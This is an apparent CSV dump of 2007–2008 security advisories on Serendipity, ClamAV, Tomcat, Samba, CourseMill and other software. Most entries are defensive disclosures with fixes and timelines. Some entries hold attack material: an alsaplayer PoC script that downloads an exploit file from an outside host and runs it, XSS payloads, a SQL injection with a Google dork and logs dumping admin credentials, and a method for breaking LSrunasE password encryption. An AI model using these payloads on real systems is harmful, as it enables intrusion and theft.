http://www.s9y.org/
Description
In the referrer plugin of the blog application serendipity, the referrer
string is not escaped, thus leading to a permanent XSS.
Example
One can inject malicious javascript code with:
wget --referer='http://<hr onMouseOver=""alert(7)"">' http://someblog.com/
Workaround/Fix
If you are using the referrer plugin, upgrade to 1.3.1.
Disclosure Timeline
2008-03-18 Vendor contacted
2008-03-18 Vendor answered
2008-03-18 Vendor fixed issue in trunk/branch revision
2008-04-22 Vendor released 1.3.1
2008-04-22 Advisory published
CVE Information
The Common Vulnerabilities and Exposures (CVE) project has assigned the name
CVE-2008-1385 to this issue. This is a candidate for inclusion in the CVE
list (http://cve.mitre.org/), which standardizes names for security problems.
Credits and copyright
This vulnerability was discovered by Hanno Boeck of schokokeks.org webhosting.
It's licensed under the creative commons attribution license.
Hanno Boeck, 2008-04-xx, http://www.hboeck.de
Cross Site Scripting (XSS) in serendipity 1.3 installer, CVE-2008-1386
References
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-1386
http://www.s9y.org/
Description
The installer of serendipity 1.3 has various Cross Site Scripting issues. This
is considered low priority, as attack scenarios are very unlikely.
Various path fields are not escaped properly, thus filling them with
javascript code will lead to XSS. MySQL error messages are not escaped, thus
the database host field can also be filled with javascript.
Workaround/Fix
If you are doing a fresh installation of serendipity, use version 1.3.1.
In general, don't leave uninstalled webapplications laying around on a public
webspace.
Disclosure Timeline
2008-03-21 Vendor contacted with patches
2008-03-21 Vendor fixed issue in trunk/branch revision
2008-04-22 Vendor released 1.3.1
2008-04-22 Advisory published
CVE Information
The Common Vulnerabilities and Exposures (CVE) project has assigned the name
CVE-2008-1386 to this issue. This is a candidate for inclusion in the CVE
list (http://cve.mitre.org/), which standardizes names for security problems.
Credits and copyright
This vulnerability was discovered by Hanno Boeck of schokokeks.org webhosting.
It's licensed under the creative commons attribution license.
Hanno Boeck, 2008-04-xx, http://www.hboeck.de
--
Hanno Böck Blog: http://www.hboeck.de/
GPG: 3DBD3B20 Jabber/Mail: hanno hboeck de"
21526,"clamav: Endless loop / hang with crafter arj, CVE-2008-1387",,CVE-2008-1387,"Advisory published at:
http://int21.de/cve/CVE-2008-1387-clamav.html
clamav: Endless loop / hang with crafter arj, CVE-2008-1387
References
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-1387
http://svn.clamav.net/svn/clamav-devel/trunk/ChangeLog
http://www.cert.fi/haavoittuvuudet/joint-advisory-archive-formats.html
Description
CERT-FI published an advisory with a large number of samples of crafted
archives.
The file with the md5sum b6046d890e6bd304e3756c88b989559a (named
b6046d890e6bd304e3756c88b989559a.arj) hangs clamav with high load.
If you're running clamav on a mailserver, an attacker can DoS your Server
remotely by sending some mails with the archive attached.
Workaround/Fix
clamav 0.93 fixes this issue beside other security issues, if you're running
clamav you should upgrade as soon as possible.
Disclosure Timeline
2008-03-17 CERT-FI publishes advisory
2008-03-26 Vendor contacted
2008-03-27 Vendor approves issue
2008-04-14 Vendor releases 0.93
2008-04-16 Advisory published
CVE Information
The Common Vulnerabilities and Exposures (CVE) project has assigned the name
CVE-2008-1387 to this issue. This is a candidate for inclusion in the CVE
list (http://cve.mitre.org/), which standardizes names for security problems.
Credits and copyright
This vulnerability was discovered by Hanno Boeck of schokokeks.org webhosting.
It's licensed under the creative commons attribution license.
Hanno Boeck, 2008-04-16, http://www.hboeck.de
--
Hanno Böck Blog: http://www.hboeck.de/
GPG: 3DBD3B20 Jabber/Mail: hanno hboeck de"
21591,[CVE-2007-5301] alsaplayer PoC - exploit,,CVE-2007-5301,"Hello,
I have released this PoC for the alsaplayer bug CVE-2007-5301.
You can find all the needed files at http://www.wekk.net/research/CVE-2007-5301/
#!/bin/sh
#
# http://www.wekk.net/research/CVE-2007-5301/CVE-2007-5301-exploit.sh
#
# Exploit for alsaplayer before 0.99.80-rc3. Tested with the debian etch package
# alsaplayer-common at version 0.99.76-9
#
# CVE-2007-5301 / DSA-1538
#
# by Albert Sellarès <whats[at]wekk[dot]net> - http://www.wekk.net
# 2008-04-09
#
# Shellcode is based on metasploit framework. If you want to test it in other
# systems, maybe you have to recalculate offsets.
#
# Example:
#
# whats@debian:~$ ./CVE-2007-5301-exploit.sh
# Alsaplayer buffer overflow < 0.99.80-rc3
# by Albert Sellarès <whats[at]wekk[dot]net> - http://www.wekk.net
#
#
# --12:19:27-- http://www.wekk.net/research/CVE-2007-5301/exploit.ogg
# => `exploit.ogg'
# Resolving www.wekk.net... 64.22.71.90
# Connecting to www.wekk.net|64.22.71.90|:80... connected.
# HTTP request sent, awaiting response... 200 OK
# Length: 5,421 (5.3K) [application/ogg]
#
# 100%[===============================================================================>] 5,421
# 12:19:28 (37.00 KB/s) - `exploit.ogg' saved [5421/5421]
# uid=1000(whats) gid=1000(whats) groups=20(dialout),24(cdrom),25(floppy),29(audio),44(video),46(plugdev),1000(whats)
#
echo -e ""Alsaplayer buffer overflow < 0.99.80-rc3""
echo -e ""by Albert Sellarès <whats[at]wekk[dot]net> - http://www.wekk.net ""
wget http://www.wekk.net/research/CVE-2007-5301/exploit.ogg
alsaplayer exploit.ogg
--
Albert Sellarès GPG id: 0x13053FFE
http://www.wekk.net whats_up jabber org
Membre de Catux.org http://catux.org
Linux User: 324456 Catalunya"
21771,"Fedora, Ubuntu publish wrong advisories for CVE-2007-6318",,CVE-2007-6318,"I have just found some false changelogs and advisories published
about a WordPress vuln I published a while ago.
Fedora:
https://www.redhat.com/archives/fedora-package-announce/2008-January/msg00079.html
Ubuntu:
https://bugs.launchpad.net/debian/+source/wordpress/+bug/181416
What they have fixed is another vuln published by Michael Brooks,
about an access control failure in WordPress, instead of SQL injection.
The detail of concerned vuln is available at
http://xforce.iss.net/xforce/xfdb/39409
CVE-2007-6318 is NOT fixed as of version 2.3.3.
Abel
--
Abel Cheung (GPG Key: 0xC67186FF)
Key fingerprint: 671C C7AE EFB5 110C D6D1 41EE 4152 E1F1 C671 86FF
--------------------------------------------------------------------
* My blog - http://me.abelcheung.org/
* Opensource Application Knowledge Assoc. - http://oaka.org/"
21833,"Cross Site Scripting (XSS) in phpstats 0.1_alpha, CVE-2008-0125",,CVE-2008-0125,"Online at:
http://int21.de/cve/CVE-2008-0125-phpstats.html
Cross Site Scripting (XSS) in phpstats 0.1_alpha, CVE-2008-0125
References
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-0125
http://www.michael-wagner.de/software/phpstats/
Description
phpstats is a tool creating statistic information about a file tree. Note that
the name is ambigious, there's more than one tool called phpstats.
The application is vulnerable to simple Cross Site Scripting, which can be
used to steal authentication information from other webapps if they're
installed on the same hostname.
Example
Assuming phpstats is installed on http://localhost/phpstats/, one can inject
JavaScript with:
http://localhost/phpstats/phpstats.php?baseDir=<script>alert(1)</script>&mode=run
Workaround/Fix
Don't use phpstats on a hostname where other web applications are installed.
Vendor has not replied and not fixed the issue yet.
Disclosure Timeline
2008-02-13 Vendor contacted
2008-03-17 Published advisory
CVE Information
The Common Vulnerabilities and Exposures (CVE) project has assigned the name
CVE-2008-0125 to this issue. This is a candidate for inclusion in the CVE
list (http://cve.mitre.org/), which standardizes names for security problems.
Credits and copyright
This vulnerability was discovered by Hanno Boeck of schokokeks.org webhosting.
It's licensed under the creative commons attribution license.
Hanno Boeck, 2008-03-17, http://www.hboeck.de
--
Hanno Böck Blog: http://www.hboeck.de/
GPG: 3DBD3B20 Jabber/Mail: hanno hboeck de"
22035,Urulu 2.1 Blind SQL Injection Vulnerability (CVE-2008-0385),,CVE-2008-0385,"#############################################################
#
# COMPASS SECURITY ADVISORY http://www.csnc.ch/
#
#############################################################
#
# Product: Urulu
# Vendor: USystems
# Subject: Blind SQL Injection Vulnerability
# Risk: High
# Author: Daniel Roethlisberger
# Date: 2008-02-25
# CVE Name: CVE-2008-0385
#
#############################################################
Introduction
------------
An AJAX based Blind SQL Injection vulnerability exists in
the Web 2.0 CMS framework Urulu [1]. A remote, anonymous
attacker can retrieve arbitrary data from the SQL database.
In addition, depending on the database setup, an attacker
may upload and execute arbitrary PHP code.
Affected Product
----------------
Vulnerable:
* Urulu 2.1 and closed-source version as of 2008-02-05.
Not vulnerable:
* Urulu 2.1.1 and closed-source version as of 2008-02-19.
Not tested:
* Other versions.
Technical Description
---------------------
An SQL injection vulnerability exists in the connectionId
argument to asynchronious XML requests. Affected are POST
requests to at least the following URIs:
/index.php/statprt/js/request
/index.php/dyn/js/request
Even though there is no client-visible feedback from the
affected SQL statements, arbitrary data can be extracted
from the database using a timing based blind SQL injection
attack. Possible targets include Urulu account passwords
or other sensitive data stored in the database.
If the Urulu database user has the FILE permission granted,
it is possible to write arbitrary PHP code to writable and
web-accessible Urulu directories using the INTO OUTFILE
syntax of MySQL.
Proof of concept code exists for both the timing-based
data extraction and the arbitrary code execution via INTO
OUTFILE and PHP.
Workaround / Patch
------------------
Upgrade to Urulu 2.1.1 or apply this uuencoded patch:
begin 644 conid-fix-urulu-2.1.diff.gz
M'XL(`*&@O4<``U3T6K;,!1]EB'_<`F%.CARY*1>-H^%=*U+`UT*L4<?QAY4
M64D$GNW)TD89_??9DLVZD:UKV<->?`7GZNB<<ZSL=T""EGH-6NI<XZD?^*44
MNTDMV:3F@N7DZBVW%%[QD5)72K_;5C^Y'&AV,=.H4;K7<*IW,""-`@HB0
MZ""2`*2%SQ_.OWX7)53!!;\%F$(PC)9%(8MRTMGN00<GLS'<_!L62X=0`A=
M;*[?#<P)950US(+FHJ9*E`6<)I`&%KRYC#?QP,%M7QKXK""Q$!F_@>`@^O$_N
MBB@21:UHP;@[P@L+^S`'CC>H2OG;W^^P&M&*^[^AFG4435""AJ/7IDJNM""S@
M2.DJYQ_(QZ:S4+``8N#[@?7[@HR#66/8UF<XAO_(J$GS67=^[0JCV/K^(T
MAC]X.^#JJ9;^J9_[]E/IVUPPV.J""F?R;?3ZC;,^S&[/;JZQV1_""MF^:KT&RO
M*=TL$5JMDWB3PFJ=7G?&#XS5-1K&8/^81DW?FC2QG:5='`@]&D2[():KBZ2[
MYPP'G)UPIN=Z26V:'_N?3-28MSMK`6A%':B]JO/ADLS,YM@_U2_T=,H/P
%_/0$````
`
end
Disclosure Timeline
-------------------
2008-02-25: Coordinated public disclosure date
2008-02-19: Unilateral release of fixed Urulu 2.1.1
2008-02-05: Initial vendor response
2008-02-05: Initial vendor notification with patch
2008-01-21: Assigned CVE-2008-0385
2008-01-20: Discovery by Daniel Roethlisberger
References
----------
[1] http://www.urulu.org/
[2] http://www.csnc.ch/en/downloads/advisories.html
--
Daniel Roethlisberger <daniel.roethlisberger csnc ch>
Compass Security Network Computing AG, Rapperswil, Switzerland
http://www.csnc.ch/ - Tel: +41 55 214 41 77 - PGP: 0x69292CBA
Security Review - Penetration Testing - Computer Forensics"
22344,[SECURITY] CVE-2007-6286: Tomcat duplicate request processing vulnerability,,CVE-2007-6286,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2007-6286: Tomcat duplicate request processing vulnerability
Severity: Important
Vendor:
The Apache Software Foundation
Versions Affected:
Tomcat 5.5.11 to 5.5.25
Tomcat 6.0.0 to 6.0.15
Description:
When using the native (APR based) connector, connecting to the SSL port
using netcat and then disconnecting without sending any data will cause
tomcat to handle a duplicate copy of one of the recent requests.
Mitigation:
6.0.x users should upgrade to 6.0.16 which includes version 1.1.12 of the
native connector.
5.5.x users should upgrade to 5.5.26 which includes version 1.1.12 of the
native connector.
Example:
See description.
Credit:
This issue was discovered by System Core (http://www.systemcore.ca/).
References:
http://tomcat.apache.org/security.html
http://tomcat.apache.org/security-5.html
http://tomcat.apache.org/security-6.html
The Apache Tomcat Security Team
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.7 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
iD8DBQFHrOcwb7IeiTPGAkMRAq+NAJ45EswKdmWWGfG8r1pr+8TMXzBHCgCePkK0
SYpXhEieSJHQcsO/rxN0ylY=
=JK4t
-----END PGP SIGNATURE-----"
22345,[SECURITY] CVE-2007-5333: Tomcat Cookie handling vulnerabilities,,CVE-2007-5333,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2007-5333: Tomcat Cookie handling vulnerabilities
Severity: low - Session hi-jacking
Vendor:
The Apache Software Foundation
Versions Affected:
Tomcat 4.1.0 to 4.1.36
Tomcat 5.5.0 to 5.5.25
Tomcat 6.0.0 to 6.0.14
Description:
The previous fix for CVE-2007-3385 was incomplete. It did not consider the
use of quotes or %5C within a cookie value.
Mitigation:
6.0.x users should upgrade to Tomcat 6.0.16 or later
5.5.x users should upgrade to Tomcat 5.5.26 or later
4.1.x users should build from the latest svn source
Examples:
+++
GET /myapp/MyCookies HTTP/1.1
Host: localhost
Cookie: name=""val "" ue""
Cookie: name1=moi
+++
http://example:8080/examples/servlets/servlet/CookieExample?cookiename=test&cookievalue=test%5c%5c%22%3B+Expires%3DThu%2C+1+Jan+2009+00%3A00%3A01+UTC%3B+Path%3D%2Fservlets-examples%2Fservlet+%3B
Credit:
The quotes issue was reported by John Kew.
The %5C issue was reported by Ishikawa Yoshihiro via JPCERT/CC.
References:
http://tomcat.apache.org/security.html
http://tomcat.apache.org/security-4.html
http://tomcat.apache.org/security-5.html
http://tomcat.apache.org/security-6.html
The Apache Tomcat Security Team
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.7 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
iD8DBQFHrONyb7IeiTPGAkMRAgKrAJwIX1fbtGT7iualwzRK8BDi+QRAkQCg3cMo
58hTHdwJzeFxLXgkLRQwBKk=
=Dnsp
-----END PGP SIGNATURE-----"
22346,CVE-2008-0002: Tomcat information disclosure vulnerability,,CVE-2008-0002,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2008-0002: Tomcat information disclosure vulnerability
Severity: important
Vendor:
The Apache Software Foundation
Versions Affected:
Tomcat 6.0.5 to 6.0.15
Description:
If an exception occurs during the processing of parameters (eg if the
client disconnects) then it is possible that the parameters submitted for
that request will be incorrectly processed as part of a following request.
Mitigation:
6.0.x users should upgrade to 6.0.16 or later.
Example:
See description.
Credit:
This issue was discovered by Chitrapandian N of AdventNet Inc.
References:
http://tomcat.apache.org/security.html
http://tomcat.apache.org/security-6.html
The Apache Tomcat Security Team
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.7 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
iD8DBQFHrNaZb7IeiTPGAkMRAgRxAKCjiAu1kTbKcE4mo0azKvtakl3u/wCcD8Vk
S5EZi3e+Da7+99Jkxb/jzn8=
=rUWc
-----END PGP SIGNATURE-----"
22465,Insecure Use of RC4 in LSrunasE and Supercrypt (CVE-2007-6340),,CVE-2007-6340,"#############################################################
#
# COMPASS SECURITY ADVISORY http://www.csnc.ch/
#
#############################################################
#
# Product: LSrunasE, Supercrypt
# Vendor: Geert Moernaut
# Type: Flawed Encryption
# Risk: Medium
# Author: Daniel Roethlisberger
# Date: 2008-01-29
# CVE Name: CVE-2007-6340
#
#############################################################
Introduction
------------
LSrunasE [1] and Supercrypt [2] are utilities used to run
commands under a different user account within Windows batch
scripts. Passwords are encrypted using strong cryptography.
Due to insecure use of the RC4 algorithm, the encryption can
be trivially broken.
Affected Product
----------------
Vulnerable:
* LSrunasE 1.0
* Supercrypt 1.0
Not vulnerable according to vendor:
* LSrunasE 2.0
* Supercrypt 2.0
Since versions 2.0 of the utilities are no longer free,
Compass Security has not been able to verify the implemented
fix.
Technical Description
---------------------
The following description of the vulnerability in LSrunasE is
also applicable to Supercrypt.
LSrunasE has two components, lsrunas.exe and lsencrypt.exe.
One would encrypt the password to the user account using
lsencrypt.exe, yielding an encrypted password. This
encrypted password is then used as parameter to
lsrunase.exe, for example in a batch script:
lsrunase.exe /user:Administrator
/password:/kpyg/8D96HYhJ61SsJagmPw
/domain:somecorp
/command:""example.exe /dosomething""
LSrunasE supposedly uses AES-256 to protect the passwords,
so an attacker would have to reverse engineer the key out
of the binary, right?
However, the properties of the encrypted passwords turn out
to be very weak, leading to an easy break very quickly.
The password encryption is equivalent to a simple XOR with
a constant key, leading to the following simple break:
1) Find the XOR keystream by XORing an arbitrary string s
with its encrypted form:
keystream = unbase64(lsencrypt(s)) XOR s
2) Now you can decrypt any encrypted password:
password = unbase64(encrypted_password) XOR keystream
This result strongly suggested that AES-256 has no role in
the encryption scheme. Digging a little deeper, Compass
Security was able to unpack the PECompact packed binary and
reverse engineer the cryptographical algorithm used by
LSrunasE. The result is interesting, since it turned out
that LSrunasE is using strong cryptography, albeit in an
insecure way.
LSrunasE uses SHA1 and RC4 to encrypt the passwords. The
SHA1 hash of a constant string is directly used as 160 bit
RC4 key. There is no random IV construction.
secret = ""(constant string embedded in the binary)""
key = sha1(secret)
encrypted_password = base64(rc4(key, password))
As a stream cipher, RC4 is only secure as long as you make
sure that no two plaintexts are encrypted using the same
keystream. When using raw RC4 without some form of unique
IV construction, the keystream will be the same for every
key. In the case of LSrunasE and Supercrypt, the very same
RC4 keystream is being generated for all encrypted passwords,
completely compromising the security of RC4.
Other Attacks
-------------
Note that this advisory is only about the insecure use of
the RC4 stream cipher, not about the fact that reverse
engineering is possible. Of course, utilities like LSrunasE
and Supercrypt cannot be secure against reverse engineering;
it will always be possible to reverse engineer the algorithm
and find the key within the binary.
However, encrypted passwords should not be very easily
broken without resorting to more time consuming binary
reverse engineering. And there is the obvious attack in
LSrunasE of copying the encrypted password and using it to
run arbitrary commands, which Supercrypt addresses.
Recommendation
--------------
Compass Security recommends not to use any utilities
which store credentials, especially not with privileged
accounts on untrusted systems. When used in logon
scripts or within automated staging scripts, privileged
accounts used with LSrunasE or similar tools can be
compromised, leading to privilege escalation.
PoC Code
--------
Available on request.
Disclosure Timeline
-------------------
2008-01-29: Coordinated public disclosure
2007-12-17: Initial vendor response
2007-12-17: Initial vendor notification
2007-12-14: Assigned CVE-2007-6340
2007-12-05: Discovery by Walter Sprenger, Ivan Buetler, Martin Sueess
and Daniel Roethlisberger of Compass Security AG
References
----------
[1] http://www.moernaut.com/default.aspx?item=lsrunase
[2] http://www.moernaut.com/default.aspx?item=supercrypt
[3] http://www.csnc.ch/en/downloads/advisories.html
--
Daniel Roethlisberger <daniel.roethlisberger csnc ch>
Compass Security Network Computing AG, Rapperswil, Switzerland
http://www.csnc.ch/ - Tel: +41 55 214 41 77 - PGP: 0x69292CBA
Security Review - Penetration Testing - Computer Forensics"
22614,Re: [CVE-2007-2449] Apache Tomcat XSS vulnerabilities in the JSP examples,,CVE-2007-2449,"Hello, I inputed the example string from IE and Firefox, but it doesn't work. The Tomcat version is 5.5.23.
It just displayed what I typed.
...
Request URI: /jsp-examples/snp/snoop.jsp;%3Cscript%3Ealert()%3C/script%3Etest.jsp
...
Can anybody help me?
Thanks a lot."
22877,[CVE-2007-5342] Apache Tomcat's default security policy is too open,,CVE-2007-5342,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2007-5342: Tomcat's default security policy is too open
Severity:
Low
Vendor:
The Apache Software Foundation
Versions Affected:
Tomcat 5.5.9 to 5.5.25
Tomcat 6.0.0 to 6.0.15
Description:
The JULI logging component allows web applications to provide their own
logging configurations. The default security policy does not restrict this
configuration and allows an untrusted web application to add files or
overwrite existing files where the Tomcat process has the necessary file
permissions to do so.
Mitigation:
Apply the following patch to the catalina.policy file
http://svn.apache.org/viewvc?rev=606594&view=rev
The patch will be included in 5.5.25 onwards and 6.0.16 onwards
This patch is also included at the end of this announcement
Example:
An application could have its own WEB-INF/classes/logging.properties
handlers = org.apache.juli.FileHandler
org.apache.juli.FileHandler.level = FINE
org.apache.juli.FileHandler.directory = ${catalina.base}/logs
org.apache.juli.FileHandler.prefix = mylog.
Credit:
This issue was discovered by Delian Krustev.
References:
http://tomcat.apache.org/security.html
Mark Thomas
*** Patch starts below this line ***
Index: catalina.policy
===================================================================
- --- catalina.policy (revision 606588)
+++ catalina.policy (working copy)
@@ -62,7 +62,19 @@
// These permissions apply to the logging API
grant codeBase ""file:${catalina.home}/bin/tomcat-juli.jar"" {
- - permission java.security.AllPermission;
+ permission java.util.PropertyPermission ""java.util.logging.config.class"", ""read"";
+ permission java.util.PropertyPermission ""java.util.logging.config.file"", ""read"";
+ permission java.lang.RuntimePermission ""shutdownHooks"";
+ permission java.io.FilePermission ""${catalina.base}${file.separator}conf${file.separator}logging.properties"", ""read"";
+ permission java.util.PropertyPermission ""catalina.base"", ""read"";
+ permission java.util.logging.LoggingPermission ""control"";
+ permission java.io.FilePermission ""${catalina.base}${file.separator}logs"", ""read, write"";
+ permission java.io.FilePermission ""${catalina.base}${file.separator}logs${file.separator}*"", ""read, write"";
+ permission java.lang.RuntimePermission ""getClassLoader"";
+ // To enable per context logging configuration, permit read access to the appropriate file.
+ // Be sure that the logging configuration is secure before enabling such access
+ // eg for the examples web application:
+ // permission java.io.FilePermission ""${catalina.base}${file.separator}webapps${file.separator}examples${file.separator}WEB-INF${file.separator}classes${file.separator}logging.properties"", ""read"";
};
// These permissions apply to the server startup code
*** Patch ends above this line ***
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.7 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
iD8DBQFHbrZQb7IeiTPGAkMRAhg1AJ4ydvIa2WIuHN8x3TKGD01xReatbgCfTtj2
8TzsMaXSUzeuEvnOuY5fmCo=
=N5J9
-----END PGP SIGNATURE-----"
22968,+ Trivantis CourseMill Enterprise Learning Management System - SQL Injection - CVE-2007-6338,,CVE-2007-6338,"+==================================================================================================+
+ Trivantis CourseMill Enterprise Learning Management System - SQL Injection - CVE-2007-6338 +
+==================================================================================================+
DISCOVERED BY:
==============
sasquatch of SecureState - swhite securestate com
HOMEPAGE:
=========
www.securestate.com
AFFECTED AREA:
==============
The username field on the login page is susceptible to SQL injection...
http://www.website.com/coursemill/userlogin.jsp seems to be the default login page.
Impact: Full data dump of underlying database ---> Username/Passwords ~~~> ???
username: '
password: test
An unrecoverable error has occurred.
Please report this message to your system administrator.
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''''' at line 1
Exit
�2006 Trivantis Corporation. Trivantis and CourseMill are registered trademarks of Trivantis. All Rights Reserved.
EXPLOITATION:
=============
Exploiter Beta from WatchFire's AppScan eXtensions Framework can be used to pull ALL data from the underlying database.
This is a free tool available from http://axf.watchfire.com/extensions/exploiter.aspx
The logins are unencrypted and stored in the ""Admin"" table. Column names are: ID, LastLogin, OrgId, Passsword.
This was found during a penetration test and was not tested as to whether or not further exploitation from inside the application is possible.
CONFIRMED AGAINST:
==================
CourseMill Enterprise v.4.1 SP4 (4527) (http://www.trivantis.com/products/coursemill.html)
EXAMPLE GOOGLEDORK:
===================
""Trivantis and CourseMill are registered trademarks of Trivantis""
VENDOR INFORMATION:
===================
Trivantis Corporation
311 Elm Street Suite 200
Cincinnati, OH 45202
877-929-0188
513-929-0188
http://www.trivantis.com
Vendor notified on 12-13-07 and the product development manager was uncooperative and hung up on us.
Sample Query Logs from Exploiter Beta:
======================================
QUERY = SELECT MIN(isnull(name,'')) FROM syscolumns WHERE xtype NOT IN (173,34,98,165,60) AND id=(SELECT id FROM sysobjects WHERE name='Admin')
Column found: table=Admin, column=ID
QUERY = SELECT MIN(isnull(name,'')) FROM syscolumns WHERE xtype NOT IN (173,34,98,165,60) AND id=(SELECT id FROM sysobjects WHERE name='Admin') AND name>'ID'
Column found: table=Admin, column=LastLogin
QUERY = SELECT MIN(isnull(name,'')) FROM syscolumns WHERE xtype NOT IN (173,34,98,165,60) AND id=(SELECT id FROM sysobjects WHERE name='Admin') AND name>'LastLogin'
Column found: table=Admin, column=OrgId
QUERY = SELECT MIN(isnull(name,'')) FROM syscolumns WHERE xtype NOT IN (173,34,98,165,60) AND id=(SELECT id FROM sysobjects WHERE name='Admin') AND name>'OrgId'
Column found: table=Admin, column=Password
QUERY = SELECT MIN(isnull(name,'')) FROM syscolumns WHERE xtype NOT IN (173,34,98,165,60) AND id=(SELECT id FROM sysobjects WHERE name='Admin') AND name>'Password'
Extracting records for table=Admin...
Exploit method is now Convert
QUERY = SELECT TOP 1 convert(nvarchar(16),COUNT(DISTINCT ID)) FROM Admin
QUERY = SELECT TOP 1 convert(nvarchar(16),COUNT(DISTINCT LastLogin)) FROM Admin
QUERY = SELECT TOP 1 convert(nvarchar(16),COUNT(DISTINCT OrgId)) FROM Admin
QUERY = SELECT TOP 1 convert(nvarchar(16),COUNT(DISTINCT Password)) FROM Admin
QUERY = SELECT MIN(RTRIM(convert(nvarchar(255),isnull(ID,'')))) FROM Admin
Value found: table=Admin, column=ID, value=admin
QUERY = SELECT MIN(RTRIM(convert(nvarchar(255),isnull(LastLogin,'')))) FROM Admin WHERE RTRIM(convert(nvarchar(255),isnull(ID,'')))='admin'
Value found: table=Admin, column=LastLogin, value=Oct 7 2007 2:45AM
QUERY = SELECT MIN(RTRIM(convert(nvarchar(255),isnull(OrgId,'')))) FROM Admin WHERE RTRIM(convert(nvarchar(255),isnull(ID,'')))='admin'
Value found: table=Admin, column=OrgId, value=
QUERY = SELECT MIN(RTRIM(convert(nvarchar(255),isnull(Password,'')))) FROM Admin WHERE RTRIM(convert(nvarchar(255),isnull(ID,'')))='admin'
Value found: table=Admin, column=Password, value=admin
Etc...
and proceeds to dump the entire database..."
23026,CVE-2007-6205,,CVE-2007-6205,"Source: http://www.int21.de/cve/CVE-2007-6205-s9y.html
Cross site scripting (XSS) in rss feed plugin of Serendipity 1.2
References
http://www.s9y.org/
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6205
Description
The Serendipity blog system contains a plugin to display the content of feeds
in the sidebar (serendipity_plugin_remoterss). If an attacker can modify the
RSS feed, it's possible to inject javascript code in the link part, because
it's not correctly escaped.
Sample code
Sample feed injecting code:
<rss version=""2.0"">
<channel><item><title>foo</title>
<link>"" onMouseOver=""alert(1)</link></item></channel>
</rss>
Workaround/Fix
Serendipity developers have fixed this in svn and all further version, please
update to 1.2.1 or above.
CVE Information
The Common Vulnerabilities and Exposures (CVE) project has assigned the name
CVE-2007-6205 to this issue. This is a candidate for inclusion in the CVE
list (http://cve.mitre.org/), which standardizes names for security problems.
Credits and copyright
This vulnerability was discovered by Hanno Boeck of schokokeks.org webhosting.
It's licensed under the creative commons attribution license.
Hanno Boeck, 2007-12-05, http://www.hboeck.de
--
Hanno Böck Blog: http://www.hboeck.de/
GPG: 3DBD3B20 Jabber/Mail: hanno hboeck de"
23336,[SAMBA] CVE-2007-5398 - Remote Code Execution in Samba's nmbd,,CVE-2007-5398,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
==========================================================
==
== Subject: Remote code execution in Samba's WINS
== server daemon (nmbd) when processing name
== registration followed name query requests.
==
== CVE ID#: CVE-2007-5398
==
== Versions: Samba 3.0.0 - 3.0.26a (inclusive)
==
== Summary: When nmbd has been configured as a WINS
== server, a client can send a series of name
== registration request followed by a specific
== name query request packet and execute
== arbitrary code.
==
==========================================================
===========
Description
===========
Secunia Research reported a vulnerability that allows for
the execution of arbitrary code in nmbd. This defect may
only be exploited when the ""wins support"" parameter has
been enabled in smb.conf.
==================
Patch Availability
==================
A patch addressing this defect has been posted to
http://www.samba.org/samba/security/
Additionally, Samba 3.0.27 has been issued as a security
release to correct the defect.
==========
Workaround
==========
Samba administrators may avoid this security issue by
disabling the ""wins support"" feature in the hosts smb.conf
file.
=======
Credits
=======
This vulnerability was reported to Samba developers by
Alin Rad Pop, Secunia Research.
The time line is as follows:
* Oct 30, 2007: Initial report to security samba org.
* Oct 30, 2007: First response from Samba developers confirming
the bug along with a proposed patch.
* Nov 15, 2007: Public security advisory to be made available.
==========================================================
== Our Code, Our Bugs, Our Responsibility.
== The Samba Team
==========================================================
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.6 (GNU/Linux)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
iD8DBQFHPEe6IR7qMdg1EfYRAqoAAJsHFk1kScYHweqRny4PP4ngQaFo7QCdElle
Cv+e7K/AE69rXcmeU67jHzQ=
=9Wap
-----END PGP SIGNATURE-----"
23337,[SAMBA] CVE-2007-4572 - GETDC mailslot processing buffer overrun in nmbd,,CVE-2007-4572,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
==========================================================
==
== Subject: Stack buffer overflow in nmbd's logon
== request processing.
==
== CVE ID#: CVE-2007-4572
==
== Versions: Samba 3.0.0 - 3.0.26a (inclusive)
==
== Summary: Processing of specially crafted GETDC
== mailslot requests can result in a buffer
== overrun in nmbd. It is not believed that
== that this issues can be exploited to
== result in remote code execution.
==
==========================================================
===========
Description
===========
Samba developers have discovered what is believed to be
a non-exploitable buffer over in nmbd during the processing
of GETDC logon server requests. This code is only used
when the Samba server is configured as a Primary or Backup
Domain Controller.
==================
Patch Availability
==================
A patch addressing this defect has been posted to
http://www.samba.org/samba/security/
Additionally, Samba 3.0.27 has been issued as a security
release to correct the defect.
==========
Workaround
==========
Samba administrators may avoid this security issue by disabling
both the ""domain logons"" and the ""domain master"" options in in
the server's smb.conf file. Note that this will disable all
domain controller features as well.
=======
Credits
=======
This vulnerability was discovered by Samba developers during
an internal code audit.
The time line is as follows:
* Sep 13, 2007: Initial report to security samba org including
proposed patch.
* Sep 14, 2007: Patch review by members of the Josh Bressers
(RedHat Security Team) and Simo Sorce (Samba/RedHat developer)
* Nov 15, 2007: Public security advisory made available.
==========================================================
== Our Code, Our Bugs, Our Responsibility.
== The Samba Team
==========================================================
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.6 (GNU/Linux)
